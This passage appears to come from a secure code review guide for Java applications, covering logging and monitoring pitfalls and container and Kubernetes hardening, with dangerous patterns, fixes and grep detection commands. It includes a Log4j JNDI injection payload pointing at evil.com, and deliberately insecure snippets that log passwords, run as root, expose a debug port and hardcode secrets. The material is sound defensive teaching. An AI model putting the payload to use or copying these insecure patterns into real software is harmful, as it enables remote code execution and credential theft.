grep -rn "setInstanceFollowRedirects\|followRedirects" --include="*.java"
```

---

## C11: Logging & Monitoring

### Key Questions
- Are passwords, tokens, or API keys logged?
- Is PII in logs masked?
- Is Log4j injection possible (message lookup)?
- Are authentication events logged?
- Are log files access-controlled?

### Commonly Missed
- `log.info("User login: " + username + " password: " + password)`
- Log4j message lookups: `${jndi:ldap://...}` in log messages
- `toString()` on entities including sensitive fields
- Spring Boot default logging including request parameters
- MDC (Mapped Diagnostic Context) with PII
- Stack traces exposing internal paths and versions

### Dangerous Patterns

```java
// Logging passwords
logger.info("Login attempt: user={} password={}", username, password);
logger.debug("Request body: {}", requestBody);  // may contain credentials

// Logging tokens
logger.info("Auth header: {}", request.getHeader("Authorization"));
logger.info("API key: {}", apiKey);

// PII in logs
logger.info("New user: email={}, ssn={}", user.getEmail(), user.getSsn());

// Log4j injection (if Log4j < 2.17.1)
logger.info("User input: {}", userInput);
// If userInput = "${jndi:ldap://evil.com/a}" -> RCE

// Lombok @ToString logging sensitive data
logger.debug("User: {}", user);  // @ToString includes all fields

// MDC with PII
MDC.put("userEmail", user.getEmail());
```

### Safe Alternatives

```java
// Log only non-sensitive data
logger.info("Login attempt: user={}", username);  // no password

// Mask PII
logger.info("New user: email={}", maskEmail(user.getEmail()));

private String maskEmail(String email) {
    int at = email.indexOf('@');
    if (at <= 1) return "***";
    return email.charAt(0) + "***" + email.substring(at);
}

// Log4j: disable message lookups (log4j2.xml)
// <Configuration>
//   <Properties>
//     <Property name="log4j2.formatMsgNoLookups">true</Property>
//   </Properties>
// </Configuration>

// Or upgrade to Log4j >= 2.17.1

// Structured logging without PII
logger.info("User login successful", kv("userId", user.getId()));
// Do not include email, name, or other PII

// Lombok: exclude sensitive fields
@ToString(exclude = {"passwordHash", "ssn", "apiKey"})
```

### Grep Detection Patterns

```bash
# Logging sensitive data
grep -rn "log.*password\|log.*passwd\|log.*token\|log.*secret\|log.*apiKey" --include="*.java" -i
grep -rn 'log.*getHeader("Authorization")' --include="*.java"

# PII in logs
grep -rn "log.*getEmail\|log.*getSsn\|log.*getPhone" --include="*.java"
grep -rn "log.*toString()" --include="*.java"

# Log4j message lookups
grep -rn "formatMsgNoLookups" --include="*.xml" --include="*.properties"

# MDC with PII
grep -rn "MDC\.put" --include="*.java" | grep -i "email\|name\|phone\|ssn"

# Log4j version check
grep -rn "log4j" pom.xml build.gradle | grep "version"
```

---

## C12: Infrastructure (IaC)

### Key Questions
- Does the container run as non-root?
- Are secrets outside Dockerfiles and Helm values?
- Are Kubernetes pods running with security contexts?
- Is the JVM configured securely?
- Are multi-stage builds used?

### Commonly Missed
- `Dockerfile` running as root (no `USER` directive)
- Fat JARs including dev dependencies
- JMX/RMI ports exposed without authentication
- Kubernetes pods without `securityContext`
- Helm values with hardcoded secrets
- `JAVA_TOOL_OPTIONS` or `JAVA_OPTS` with debug flags in production
- Missing resource limits in Kubernetes

### Dangerous Patterns

```dockerfile
# Running as root with JDK (not JRE)
FROM openjdk:17
COPY target/app.jar /app.jar
ENV DB_PASSWORD=secret
EXPOSE 8080 9090 5005
CMD ["java", "-agentlib:jdwp=transport=dt_socket,server=y,address=*:5005", "-jar", "/app.jar"]
```

```yaml
# Kubernetes: insecure pod
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        privileged: true
        runAsUser: 0
      env:
        - name: DB_PASSWORD
          value: "supersecret"  # hardcoded
```

```yaml
# Helm values.yaml with secrets
database:
  password: "supersecret"
  host: "db.example.com"
```

### Safe Alternatives

```dockerfile
# Multi-stage build, JRE only, non-root
FROM eclipse-temurin:17-jdk AS builder
WORKDIR /app
COPY . .
RUN ./mvnw package -DskipTests

FROM eclipse-temurin:17-jre-alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app
COPY --from=builder /app/target/app.jar ./app.jar
USER appuser
EXPOSE 8080
HEALTHCHECK CMD ["java", "-cp", "app.jar", "com.example.HealthCheck"]
ENTRYPOINT ["java", "-jar", "app.jar"]
```

```yaml
# Kubernetes: secure pod
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  containers:
    - name: app
      image: myapp@sha256:abc123...
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        limits:
          memory: "512Mi"
          cpu: "500m"
      env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: password
```

### Grep Detection Patterns

```bash
# Dockerfile issues
grep -rn "FROM.*latest\|FROM openjdk:" Dockerfile*
grep -n "USER" Dockerfile*  # check if exists
grep -rn "^ENV.*PASSWORD\|^ENV.*SECRET\|^ENV.*KEY" Dockerfile*
grep -rn "jdwp\|agentlib\|debug" Dockerfile*
grep -rn "EXPOSE.*5005\|EXPOSE.*9090\|EXPOSE.*1099" Dockerfile*  # debug/JMX ports

# Kubernetes security
grep -rn "privileged:\s*true" --include="*.yaml" --include="*.yml"
grep -rn "runAsUser:\s*0\|runAsNonRoot:\s*false" --include="*.yaml" --include="*.yml"
grep -rn "hostNetwork:\s*true\|hostPID:\s*true" --include="*.yaml" --include="*.yml"

# Hardcoded secrets in K8s/Helm
grep -rn "value:.*password\|value:.*secret\|value:.*key" --include="*.yaml" --include="*.yml" -i | grep -v "valueFrom\|secretKeyRef"

# Helm values
grep -rn "password:\|secret:\|key:" values.yaml | grep -v "{{"

# JVM debug flags
grep -rn "JAVA_TOOL_OPTIONS\|JAVA_OPTS" Dockerfile* docker-compose*.yml | grep -i "debug\|jdwp\|agentlib"

# Resource limits
grep -rn "resources:" --include="*.yaml" --include="*.yml" -A 5 | grep "limits"
```
